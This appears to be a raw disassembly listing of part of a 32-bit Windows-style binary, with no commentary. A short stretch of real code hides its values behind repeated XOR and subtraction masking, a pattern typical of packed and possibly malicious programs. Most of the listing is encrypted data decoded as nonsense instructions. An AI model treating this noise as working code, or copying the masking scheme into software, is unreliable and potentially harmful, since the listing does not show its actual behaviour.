  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	sbb    edx,DWORD PTR [ebx-0x6b]
  407498:	ret    0xc0a4
  40749b:	jle    0x40751b
  40749d:	and    BYTE PTR [ebp+0x7e],bh
  4074a0:	jle    0x407486
  4074a2:	add    al,0xd9
  4074a4:	imul   esi,DWORD PTR [ebx-0x52ed6c0a],0xb439e5b8
  4074ae:	push   edx
  4074af:	push   ss
  4074b0:	outs   dx,DWORD PTR ds:[esi]
  4074b1:	add    BYTE PTR [edi-0x48],0x7c
  4074b5:	dec    ebx
  4074b6:	jns    0x40752f
  4074b8:	jne    0x407461
  4074ba:	push   ds
  4074bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074bc:	or     eax,0xae7077a0
  4074c1:	dec    esi
  4074c2:	popf   
  4074c3:	hlt    
  4074c4:	ss es sub edx,esp
  4074c8:	test   eax,0xaac48a8
  4074cd:	(bad)  
  4074ce:	xor    esi,DWORD PTR [edx]
  4074d0:	stos   BYTE PTR es:[edi],al
  4074d1:	mov    gs,WORD PTR [ecx+0x73]
  4074d4:	sti    
  4074d5:	add    BYTE PTR [edx],cl
  4074d7:	sbb    edi,DWORD PTR [ebx]
  4074d9:	cmp    eax,0xa5900763
  4074de:	js     0x4074c0
  4074e0:	scas   al,BYTE PTR es:[edi]
  4074e1:	cmp    eax,0x408f353d
  4074e6:	call   0xa726e227
  4074eb:	idiv   BYTE PTR [ecx+0x1df2f9e9]
  4074f1:	mov    esp,edi
  4074f3:	sub    al,0xbb
  4074f5:	inc    edx
  4074f6:	xor    eax,0x66152d32
  4074fb:	jge    0x407533
  4074fd:	inc    esp
  4074fe:	sub    DWORD PTR [edx],edx
  407500:	mov    bl,0x10
  407502:	add    BYTE PTR [edi-0x535f1059],al
  407508:	in     al,0xa3
  40750a:	test   al,0x24
  40750c:	dec    esi
  40750d:	aam    0xf3
  40750f:	sub    al,0xab
  407511:	sub    ch,BYTE PTR [edx+0x6e]
  407514:	sbb    edi,ebx
  407516:	iret   
  407517:	inc    esi
  407518:	sub    ecx,ebx
  40751a:	out    dx,al
  40751b:	sub    bh,cl
  40751d:	dec    esi
  40751e:	adc    eax,0xc8773f53
  407523:	sub    al,0xca
  407525:	xchg   edx,eax
  407526:	aaa    
  407527:	sbb    eax,0xc3d633b3
  40752c:	push   cs
  40752d:	stos   DWORD PTR es:[edi],eax
  40752e:	fnclex 
  407530:	inc    esi
  407531:	adc    BYTE PTR [ebp+0x3a],dh
  407534:	lds    edx,FWORD PTR [edx]
  407536:	sub    edi,esp
  407538:	mov    ds:0x3f7843e7,al
  40753d:	ss xchg edi,eax
  40753f:	das    
  407540:	addr16 ret 0x111
  407544:	jle    0x4075a3
  407546:	sub    BYTE PTR [ebx+0x0],0xa9
  40754a:	aad    0x8
  40754c:	sub    DWORD PTR [eax],ecx
  40754e:	enter  0xb971,0x1
  407552:	sti    
  407553:	js     0x40751b
  407555:	adc    eax,0x69afa16c
  40755a:	xchg   DWORD PTR [edi+eax*8-0x28d0cf73],ecx
  407561:	mov    ah,0x93
  407563:	mov    edi,0x7b283f73
  407568:	pop    edi
  407569:	test   edx,ecx
  40756b:	mov    WORD PTR [edx-0x641d4420],ss
  407571:	push   cs
  407572:	arpl   WORD PTR [edx-0x7ecb2ec3],dx
  407578:	lods   al,BYTE PTR ds:[esi]
  407579:	stc    
  40757a:	inc    esi
  40757b:	sbb    bh,cl
  40757d:	dec    ebx
  40757e:	sub    DWORD PTR [esi+0x5d],edi
  407581:	xlat   BYTE PTR ds:[ebx]
  407582:	add    al,0x84
  407584:	push   cs
  407585:	mov    ah,ah
  407587:	inc    eax
  407588:	mov    esp,0x6c98a92c
  40758d:	mov    ebp,0xff477704
  407592:	pop    ss
  407593:	mov    ebp,0xe353c927
  407598:	ja     0x4075a7
  40759a:	jmp    0x9d687222
  40759f:	ins    DWORD PTR es:[edi],dx
  4075a0:	mov    eax,0x26e35388
  4075a5:	daa    
  4075a6:	jg     0x4075fe
  4075a8:	cld    
  4075a9:	imul   edx,ebp,0xdc98803a
  4075af:	ffree  st(7)
  4075b1:	test   al,0xb5
  4075b3:	add    BYTE PTR [edx+0x630e50fb],ah
  4075b9:	cmp    esp,edi
  4075bb:	sub    BYTE PTR [edx+ebx*1],bl
  4075be:	xchg   ebx,ecx
  4075c0:	or     eax,0xea4ec0ef
  4075c5:	pop    eax
  4075c6:	pushf  
  4075c7:	rcr    DWORD PTR ds:0x6740c893,cl
  4075cd:	inc    ebx
  4075ce:	sbb    eax,0x91704f3f
  4075d3:	ret    0x7ed4
  4075d6:	imul   esi,DWORD PTR [ecx-0x23],0xfffffffb
  4075da:	jg     0x4075bd
  4075dc:	or     BYTE PTR [edi+0xe873de2],dl
  4075e2:	mov    ds:0x2cb18f44,eax
  4075e7:	js     0x4075f4
  4075e9:	push   esi
  4075ea:	sbb    dh,BYTE PTR [edi-0x58720f58]
  4075f0:	pop    edi
  4075f1:	ret    
  4075f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075f3:	pop    ebp
  4075f4:	add    BYTE PTR [ebx-0x56],cl
  4075f7:	ss inc eax
  4075f9:	rol    DWORD PTR [ebx+ecx*2-0x65b75b02],cl
  407600:	(bad)  
  407602:	je     0x40762e
  407604:	push   ebp
  407605:	das    
  407606:	ret    
  407607:	sub    al,0x4
  407609:	inc    ecx
  40760a:	pushf  
  40760b:	mov    ch,0xa9
  40760d:	add    eax,0xde348ecd
  407612:	pop    es
  407613:	fld    QWORD PTR [eax+0x6c]
  407616:	or     DWORD PTR [edi+esi*1+0x3a062fe7],0xffffffd2
  40761e:	js     0x407657
  407620:	and    edi,DWORD PTR [edx-0x19b74576]
  407626:	in     eax,dx
  407627:	fstp   TBYTE PTR [edi+0x17]
  40762a:	mov    ch,0xe5
  40762c:	call   0xd99824bc
  407631:	mov    dl,0x55
  407633:	fisttp QWORD PTR [edx+0x1e3fe620]
  407639:	hlt    
  40763a:	pop    edx
  40763b:	sbb    edi,DWORD PTR [edx-0x5a]
  40763e:	sar    bl,cl
  407640:	hlt    
  407641:	mov    esp,0x4ab29a1a
  407646:	add    al,0xa3
  407648:	ins    DWORD PTR es:[edi],dx
  407649:	pop    ecx
  40764a:	sub    dh,dl
  40764c:	mov    eax,0x97bee0ed
  407651:	pop    ecx
  407652:	retf   0xd58e
  407655:	or     eax,0x59106ffc
  40765a:	sub    DWORD PTR [edx],ecx
  40765c:	repz sub BYTE PTR ds:0xb7c0a25d,dh
  407663:	sub    al,BYTE PTR [edx]
  407665:	in     eax,0xb5
  407667:	shl    esp,0xde
  40766a:	mov    eax,0xfa0cca91
  40766f:	nop
  407670:	test   BYTE PTR [ecx],ch
  407672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407673:	cld    
  407674:	cwde   
  407675:	daa    
  407676:	cld    
  407677:	pop    ebx
  407678:	sbb    BYTE PTR [ecx+edx*4+0x502bd072],bl
  40767f:	cmp    bl,dl
  407681:	inc    ecx
  407682:	cs scas eax,DWORD PTR es:[edi]
  407684:	push   ecx
  407685:	test   DWORD PTR [ebx-0x65],0xd4046965
  40768c:	xchg   ebp,eax
  40768d:	(bad)  [ecx]
  40768f:	pop    ebp
  407690:	adc    DWORD PTR [edi],eax
  407692:	pushf  
  407693:	jl     0x4076b3
  407695:	inc    ecx
  407696:	icebp  
  407697:	js     0x40765d
  407699:	or     ch,dl
  40769b:	add    BYTE PTR [eax+0x4de8f88e],cl
  4076a1:	dec    ecx
  4076a2:	dec    esp
  4076a3:	mov    WORD PTR [esi-0x7c2ad9fc],?
  4076a9:	outs   dx,DWORD PTR ds:[esi]
  4076aa:	mov    DWORD PTR [eax-0x37],edi
  4076ad:	mov    ebp,0xbf2fb6a7
  4076b2:	xor    ebx,ebx
  4076b4:	retf   0x242
  4076b7:	sbb    DWORD PTR [eax],esp
  4076b9:	mov    ch,0xba
  4076bb:	push   esi
  4076bc:	push   es
  4076bd:	std    
  4076be:	aam    0x65
  4076c0:	fisub  WORD PTR [ecx-0x32]
  4076c3:	stos   BYTE PTR es:[edi],al
  4076c4:	jb     0x407689
  4076c6:	test   eax,0x3ef06596
  4076cb:	pushf  
  4076cc:	push   ecx
  4076cd:	in     al,dx
  4076ce:	out    dx,al
  4076cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d0:	leave  
  4076d1:	fldcw  WORD PTR [eax-0x11]
  4076d4:	inc    esp
  4076d5:	es rcl dl,1
  4076d8:	adc    DWORD PTR [edx*8-0x71319819],0xffffffe9
  4076e0:	mov    BYTE PTR [esi+0x6b],bh
  4076e3:	ror    BYTE PTR [esi],0xa8
  4076e6:	enter  0x35bc,0xd8
  4076ea:	push   ds
  4076eb:	aad    0x24
  4076ed:	inc    esi
  4076ee:	loopne 0x4076c1
  4076f0:	add    ebx,ecx
  4076f2:	and    DWORD PTR [esi],esp
  4076f4:	out    0xee,al
  4076f6:	cs or  ch,dl
  4076f9:	or     DWORD PTR [ebx],ebx
  4076fb:	xchg   ecx,eax
  4076fc:	in     al,0x4b
  4076fe:	(bad)  
  4076ff:	aad    0x55
  407701:	jnp    0x40771d
  407703:	sbb    esp,DWORD PTR [ebp-0x3e31cc22]
  407709:	leave  
  40770a:	retf   
  40770b:	add    ch,BYTE PTR [ecx-0x4f9b8fea]
  407711:	mov    WORD PTR [edx-0x23],fs
  407714:	or     eax,0x5e5f98ea
  407719:	gs inc ebp
  40771b:	fmul   st(1),st
  40771d:	add    al,0xea
  40771f:	shl    DWORD PTR [ebp+ebp*4-0x40],cl
  407723:	inc    DWORD PTR [eax+0x16]
  407726:	imul   eax,DWORD PTR [ecx],0xc6f84a0b
  40772c:	sub    al,0x46
  40772e:	pusha  
  40772f:	sub    BYTE PTR [ebp+0xf9547c4],al
  407735:	xchg   esp,eax
  407736:	xchg   DWORD PTR [ecx],eax
  407738:	dec    edi
  407739:	pushw  ss
  40773b:	cmp    BYTE PTR [ebx-0x12],0x4
  40773f:	leave  
  407740:	sahf   
  407741:	pop    edi
  407742:	inc    edi
  407743:	test   eax,0xa24e841d
  407748:	jp     0x40778a
  40774a:	int3   
  40774b:	or     esp,DWORD PTR [edx]
  40774d:	out    0xd2,eax
  40774f:	mov    al,ds:0x9efeb6e5
  407754:	rcr    cl,cl
  407756:	mov    BYTE PTR [ecx],bl
  407758:	cwde   
  407759:	test   DWORD PTR [esi+esi*2],esp
  40775c:	jnp    0x4077b2
  40775e:	cmp    al,0x6f
  407760:	sbb    cl,ch
  407762:	sub    al,0x19
  407764:	mov    WORD PTR [edx],ss
  407766:	repz jae 0x4077e4
  407769:	adc    ecx,edx
  40776b:	leave  
  40776c:	sub    eax,0x56c1d061
  407771:	mov    bh,0xaa
  407773:	inc    ebp
  407774:	xchg   DWORD PTR [esi],edi
  407776:	cmp    eax,0x6dde27b8
  40777b:	mov    ebp,0xb3ad2756
  407780:	jmp    0xc8ee98b
  407785:	adc    al,0x6c
  407787:	cmp    ecx,DWORD PTR [eax+0x48]
  40778a:	adc    edx,DWORD PTR [eax+ecx*2-0x11]
  40778e:	add    al,0x6f
  407790:	clc    
  407791:	jg     0x40773e
  407793:	aaa    
  407794:	xchg   ebp,eax
  407795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407796:	daa    
  407797:	pop    ss
  407798:	jbe    0x40776f
  40779a:	stc    
  40779b:	retf   
  40779c:	nop
  40779d:	push   es
  40779e:	xlat   BYTE PTR ds:[ebx]
  40779f:	test   BYTE PTR [ebp+0x7a],0x63
  4077a3:	push   es
  4077a4:	test   eax,0xf7db65ba
  4077a9:	jne    0x40773e
  4077ab:	dec    ebp
  4077ac:	daa    
  4077ad:	imul   ebp,DWORD PTR [edx+edi*4-0x7509a5d6],0xb56840ae
  4077b8:	and    al,0xd0
  4077ba:	xchg   DWORD PTR [edx],ebp
  4077bc:	mov    ebx,0x4c2fe4a7
  4077c1:	out    0x13,eax
  4077c3:	push   0xdfe199a6
  4077c8:	pusha  
  4077c9:	cmp    al,0x37
  4077cb:	push   esp
  4077cc:	xor    BYTE PTR [ebp-0x3b274ce],ah
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	mov    eax,0x56975650
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x4077e7
  407801:	xchg   edx,eax
  407802:	mov    eax,ds:0xa5e0afd1
  407807:	sub    eax,0x94070005
  40780c:	in     eax,dx
  40780d:	dec    esp
  40780e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40780f:	leave  
  407810:	into   
  407811:	and    ecx,edx
  407813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407814:	and    BYTE PTR ds:0xe91ec249,bh
  40781a:	mov    cl,0x48
  40781c:	bound  ecx,QWORD PTR [edi+0x666da8d6]
  407822:	xor    dl,al
  407824:	out    dx,eax
  407825:	cmp    eax,0xc79509bb
  40782a:	sub    DWORD PTR [esp+edx*2-0x76],eax
  40782e:	ja     0x4077c6
  407830:	fwait
  407831:	mov    dh,0xee
  407833:	jb     0x4077c0
  407835:	sub    ecx,DWORD PTR [ecx]
  407837:	xor    esp,0x4a
  40783a:	in     eax,dx
  40783b:	xchg   esp,eax
  40783c:	sbb    eax,0xcc4a37ee
  407841:	push   ds
  407842:	jo     0x40785a
  407844:	jb     0x4078b2
  407846:	sub    ah,bl
  407848:	ficom  WORD PTR ds:0x2bc33583
  40784e:	ds ins BYTE PTR es:[edi],dx
  407850:	xchg   ecx,eax
  407851:	or     esi,ecx
  407853:	push   ss
  407854:	push   ebx
  407855:	ror    DWORD PTR [ebx+eiz*8],cl
  407858:	jns    0x4078a8
  40785a:	jle    0x40782e
  40785c:	jns    0x407872
  40785e:	and    esi,DWORD PTR [eax]
  407860:	in     eax,dx
  407861:	xchg   ecx,eax
  407862:	cli    
  407863:	sub    ecx,DWORD PTR [esi+0x4316abdf]
  407869:	mov    ss,WORD PTR [edi-0x68b89ef6]
  40786f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407870:	fwait
  407871:	and    ah,BYTE PTR [edx]
  407873:	dec    esi
  407874:	int3   
  407875:	jnp    0x407892
  407877:	mov    WORD PTR [edx+ebx*8-0x73],ds
  40787b:	cmp    dl,BYTE PTR [edx-0x6d]
  40787e:	mov    ah,0x24
  407880:	jmp    0x7fdc8a3c
  407885:	push   edi
  407886:	jp     0x4078db
  407888:	arpl   WORD PTR [ebx],ax
  40788a:	out    0x1f,eax
  40788c:	and    al,0xf4
  40788e:	into   
  40788f:	xor    DWORD PTR [esi+0x18],edi
  407892:	xor    dh,BYTE PTR [edi]
  407894:	imul   ecx,ebx,0x5c
  407897:	fcmovnu st,st(7)
  407899:	xchg   esi,eax
  40789a:	xor    eax,0x47d5771b
  40789f:	loopne 0x4078fb
  4078a1:	inc    esi
  4078a2:	mov    ecx,0x874de776
  4078a7:	push   es
  4078a8:	ins    DWORD PTR es:[edi],dx
  4078a9:	lea    ebp,[ecx+0xf43b40a]
  4078af:	pop    esp
  4078b0:	pusha  
  4078b1:	push   ebp
  4078b2:	jg     0x4078a1
  4078b4:	lahf   
  4078b5:	fcom   QWORD PTR [edi-0x21]
  4078b8:	popf   
  4078b9:	and    DWORD PTR [ecx+0x79],ebp
  4078bc:	jo     0x407872
  4078be:	leave  
  4078bf:	sbb    al,0xdb
  4078c1:	in     eax,0xce
  4078c3:	std    
  4078c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c5:	dec    esp
  4078c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c7:	or     edi,0x60
  4078ca:	loopne 0x407895
  4078cc:	push   0xba0f378
  4078d1:	and    ebp,DWORD PTR [edx+0x1]
  4078d4:	sbb    BYTE PTR [eax],bh
  4078d6:	xchg   dl,bl
  4078d8:	push   eax
  4078d9:	cmp    al,0xae
  4078db:	sbb    eax,0x7c1bde6d
  4078e0:	in     al,0xe7
  4078e2:	iret   
  4078e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078e4:	jo     0x407925
  4078e6:	cdq    
  4078e7:	sbb    eax,0x3e0ea7c2
  4078ec:	or     DWORD PTR [edx+0x6a],ecx
  4078ef:	loope  0x407924
  4078f1:	(bad)
  4078f5:	loopne 0x4078c9
  4078f7:	jmp    0x407946
  4078f9:	retf   
  4078fa:	push   cs
  4078fb:	dec    eax
  4078fc:	and    al,0x17
  4078fe:	pop    DWORD PTR [edx+0x4c]
  407901:	mov    bl,ah
  407903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407904:	xor    eax,0x3054d854
  407909:	mov    WORD PTR [edx+0x42],gs
  40790c:	out    dx,eax
  40790d:	rcl    DWORD PTR [esi+0xf],1
  407910:	push   edx
  407911:	mov    ebp,esi
  407913:	add    DWORD PTR [ecx],eax
  407915:	(bad)  
  407916:	aam    0xa0
  407918:	and    DWORD PTR [ebx],esi
  40791a:	cli    
  40791b:	xchg   ebp,eax
  40791c:	pop    esp
  40791d:	lods   eax,DWORD PTR ds:[esi]
  40791e:	dec    esi
  40791f:	cmp    edi,0x7f4e0656
  407925:	int    0x60
  407927:	in     eax,0xd2
  407929:	inc    esp
  40792a:	xchg   ecx,eax
  40792b:	mov    bh,0x3f
  40792d:	scas   al,BYTE PTR es:[edi]
  40792e:	test   al,0x36
  407930:	mov    al,ds:0x6675a76c
  407935:	outs   dx,DWORD PTR ds:[esi]
  407936:	jnp    0x40793c
  407938:	hlt    
  407939:	inc    edx
  40793a:	test   BYTE PTR [edx],ah
  40793c:	sbb    dh,BYTE PTR [ecx-0x63b12465]
  407942:	rol    DWORD PTR [edx],cl
  407944:	inc    edi
  407945:	mov    bl,ah
  407947:	sub    bh,BYTE PTR [ebx]
  407949:	jno    0x407976
  40794b:	cmp    al,0x7c
  40794d:	pop    ecx
  40794e:	dec    esi
  40794f:	and    BYTE PTR [eax],ah
  407951:	inc    esi
  407952:	pcmpeqb mm0,mm6
  407955:	cs stos DWORD PTR es:[edi],eax
  407957:	lods   al,BYTE PTR ds:[esi]
  407958:	popf   
  407959:	out    0x28,eax
  40795b:	inc    eax
  40795c:	jo     0x40790d
  40795e:	in     eax,0xb9
  407960:	mov    BYTE PTR [edi],dl
  407962:	dec    edx
  407963:	mov    bl,0xc8
  407965:	jmp    DWORD PTR [ebx+0x18]
  407968:	mov    ?,WORD PTR [edi]
  40796a:	push   es
  40796b:	pop    esp
  40796c:	and    BYTE PTR [ecx],ah
  40796e:	pop    es
  40796f:	mov    eax,ds:0xfd7f46fe
  407974:	pop    edx
  407975:	aaa    
  407976:	pop    eax
  407977:	dec    ebx
  407978:	xchg   esi,eax
  407979:	add    bh,0x2
  40797c:	fadd   DWORD PTR [edi]
  40797e:	adc    esi,DWORD PTR [edi-0x71]
  407981:	xchg   ebp,eax
  407982:	or     dl,al
  407984:	gs pop es
  407986:	bnd jge 0x407934
  407989:	push   cs
  40798a:	xor    al,0x4d
  40798c:	pop    edx
  40798d:	push   ecx
  40798e:	add    esi,DWORD PTR [esi+0x47]
  407991:	shl    BYTE PTR [ebx],0x32
  407994:	dec    edx
  407995:	pop    ds
  407996:	sub    DWORD PTR [esi-0x7c],eax
  407999:	retf   0xb1d0
  40799c:	call   0xe283:0x8ac4ca56
  4079a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a4:	jae    0x4079b7
  4079a6:	sub    eax,DWORD PTR [ecx-0x15a29db6]
  4079ac:	add    al,0x19
  4079ae:	dec    edi
  4079af:	add    al,0xed
  4079b1:	retf   
  4079b2:	sub    BYTE PTR [edi],dl
  4079b4:	mov    al,0x75
  4079b6:	sub    eax,0xe2e3a86c
  4079bb:	data16 stos BYTE PTR es:[edi],al
  4079bd:	int3   
  4079be:	add    DWORD PTR [edi+ecx*2+0x5ec365c9],edi
  4079c5:	out    0xb4,al
  4079c7:	jnp    0x4079e9
  4079c9:	jmp    0x407999
  4079cb:	cdq    
  4079cc:	mov    ebp,0x8a3ab70a
  4079d1:	(bad)  [eax+0x2]
  4079d4:	and    eax,0x8ccbaa1f
  4079d9:	inc    edi
  4079da:	add    al,0xfe
  4079dc:	fild   WORD PTR [esi-0x2c]
  4079df:	dec    edi
  4079e0:	icebp  
  4079e1:	jmp    0x4079bd
  4079e3:	and    eax,0x39ab5d5c
  4079e8:	iret   
  4079e9:	mov    al,0x29
  4079eb:	mov    esi,0x755aa96a
  4079f0:	int3   
  4079f1:	cdq    
  4079f2:	adc    dl,bh
  4079f4:	arpl   WORD PTR es:[edx-0x77209347],sp
  4079fb:	out    0xaf,al
  4079fd:	test   BYTE PTR [ebx+eax*1+0x3e0f7a91],ch
  407a04:	push   cs
  407a05:	pop    ss
  407a06:	adc    edi,esp
  407a08:	loope  0x4079a9
  407a0a:	fild   WORD PTR [eax]
  407a0c:	xor    eax,0x45f7e5a6
  407a11:	ja     0x407a67
  407a13:	test   bl,bl
  407a15:	ret    
  407a16:	add    BYTE PTR [eax-0x24],dh
  407a19:	push   ecx
  407a1a:	xchg   edi,eax
  407a1b:	test   al,0x33
  407a1d:	dec    ecx
  407a1e:	xlat   BYTE PTR ds:[ebx]
  407a1f:	and    al,0x82
  407a21:	mov    ecx,0xcfb83948
  407a26:	mov    ch,0xa3
  407a28:	or     eax,0xa9fe2092
  407a2d:	retf   0x87f1
  407a30:	add    edx,DWORD PTR [esi+0x7367228b]
  407a36:	push   ds
  407a37:	aad    0xd5
  407a39:	cwde   
  407a3a:	into   
  407a3b:	nop
  407a3c:	add    esi,esi
  407a3e:	enter  0xdf57,0x93
  407a42:	pop    ebp
  407a43:	sub    bl,BYTE PTR ds:0x11ab51c7
  407a49:	pop    edi
  407a4a:	dec    ebp
  407a4b:	or     DWORD PTR [edi+0x13],edx
  407a4e:	jns    0x407ab2
  407a50:	sub    BYTE PTR [edi+0x2878feff],dl
  407a56:	inc    ecx
  407a57:	sub    al,0xd5
  407a59:	stos   DWORD PTR es:[edi],eax
  407a5a:	dec    esp
  407a5b:	adc    dl,al
  407a5d:	or     eax,DWORD PTR [ebp+0x743c4daa]
  407a63:	fwait
  407a64:	das    
  407a65:	shr    BYTE PTR [ebp-0x4fac7059],cl
  407a6b:	outs   dx,DWORD PTR ds:[esi]
  407a6c:	fistp  WORD PTR [esi-0x11318290]
  407a72:	repz pop edi
  407a74:	inc    ebx
  407a75:	popa   
  407a76:	sbb    al,0xee
  407a78:	ror    BYTE PTR [ebp-0x6b],0xb6
  407a7c:	iret   
  407a7d:	or     DWORD PTR [edi],ebp
  407a7f:	cmp    dh,BYTE PTR [edi]
  407a81:	jae    0x407a5f
  407a83:	js     0x407a9b
  407a85:	pusha  
  407a86:	pop    esp
  407a87:	add    bh,ch
  407a89:	rcl    DWORD PTR [edi-0x296ca916],cl
  407a8f:	inc    ebx
  407a90:	and    al,0x20
  407a92:	push   ecx
  407a93:	out    0x5a,al
  407a95:	pop    eax
  407a96:	in     eax,0xc2
  407a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a99:	mov    eax,ds:0x5803a144
  407a9e:	pop    ebx
  407a9f:	adc    BYTE PTR [ebx],bl
  407aa1:	out    dx,al
  407aa2:	jae    0x407a72
  407aa4:	icebp  
  407aa5:	add    ah,bh
  407aa7:	mov    dl,0x66
  407aa9:	ret    
  407aaa:	test   eax,0xedce7542
  407aaf:	xchg   ebp,eax
  407ab0:	sub    edx,DWORD PTR [eax+edi*2-0x2e5f4d5]
  407ab7:	pop    ebp
  407ab8:	jle    0x407abf
  407aba:	mov    al,ds:0xb1b7dc
  407abf:	jmp    0x888b8e21
  407ac4:	adc    dl,cl
  407ac6:	jle    0x407ab5
  407ac8:	loopne 0x407a81
  407aca:	mov    edi,0xaee8c616
  407acf:	lds    ebp,FWORD PTR [ecx-0x54]
  407ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad3:	push   esp
  407ad4:	inc    edi
  407ad5:	ret    
  407ad6:	jg     0x407b22
  407ad8:	and    eax,0xda693cb6
  407add:	fsub   DWORD PTR [edx-0x73778e3f]
  407ae3:	imul   ebp,DWORD PTR [ebx+0x21ad2f1d],0xa0ee4350
  407aed:	das    
  407aee:	jnp    0x407ad9
  407af0:	fmul   QWORD PTR [esp+ecx*1]
  407af3:	and    al,0x46
  407af5:	enter  0x4a55,0xa4
  407af9:	push   0xd84eca7d
  407afe:	jns    0x407ad5
  407b00:	shr    cl,0x30
  407b03:	jp     0x407ad6
  407b05:	shr    DWORD PTR [ebx-0x5012844b],cl
  407b0b:	or     eax,0x34a3fc8e
